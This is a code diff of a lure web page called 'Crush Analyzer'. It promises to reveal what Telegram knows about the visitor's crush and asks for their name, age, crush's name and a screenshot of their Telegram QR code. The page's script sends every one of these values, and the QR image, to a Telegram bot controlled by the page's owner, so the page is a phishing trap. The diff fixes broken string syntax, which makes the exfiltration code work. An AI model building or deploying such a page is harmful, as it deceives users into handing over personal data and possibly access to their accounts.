@@ -1,8 +1,9 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Telegram Knows About Your Crush</title>
+  <title>Crush App</title>
   <style>
     body { font-family: Arial; padding: 20px; font-size: 26px; }
     label, input, button { display: block; margin-top: 12px; font-size: 24px; }
@@ -11,7 +12,7 @@
 </head>
 <body>
   <h2>🔮 Crush Analyzer 🔮</h2>
-  <p>Send the QR code on your Telegram app, their name, your age, and your name. (Then you will know the truth ❤️)</p>
+  <p>Upload the screnshot of QR on your telegram(setting---->on the top), your crush name, your age, and your name. (then you will know what telegram knows about your crush ❤️)</p>
 
   <form id="crushForm">
     <label>Your Name:</label>
@@ -23,10 +24,10 @@
     <label>Crush's Name:</label>
     <input type="text" id="crushName" required>
 
-    <label>Upload QR screenshot:</label>
-    <input type="file" id="YourQR(screenshot)" accept="image/*" required>
+    <label>Upload the screenshot of the QR:</label>
+    <input type="file" id="crushPhoto" accept="image/*" required>
 
-    <button type="submit">Tell Me the Truth 🔥</button>
+    <button type="submit">Tell me The Truth 🔥</button>
   </form>
 
   <p id="status" style="color:green;"></p>
@@ -41,11 +42,11 @@
       const name = document.getElementById('yourName').value;
       const age = document.getElementById('yourAge').value;
       const crush = document.getElementById('crushName').value;
-      const photo = document.getElementById('YourQR(screenshot)').files[0];
+      const photo = document.getElementById('crushPhoto').files[0];
 
-      // ✅ Step 1: Send Text Info
-      const text = 💌 New Crush Submission:\n\n👤 Your Name: ${name}\n🎂 Your Age: ${age}\n❤️ Crush's Name: ${crush};
-      await fetch(https://api.telegram.org/bot${BOT_TOKEN}/sendMessage, {
+      // Step 1: Send text info
+      const text = `💌 New Crush Submission:\n\n👤 Your Name: ${name}\n🎂 Your Age: ${age}\n❤️ Crush's Name: ${crush}`;
+      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
@@ -54,12 +55,12 @@
         })
       });
 
-      // ✅ Step 2: Send Photo
+      // Step 2: Send photo
       const formData = new FormData();
       formData.append('chat_id', CHAT_ID);
       formData.append('photo', photo);
 
-      await fetch(https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto, {
+      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
         method: 'POST',
         body: formData
       });
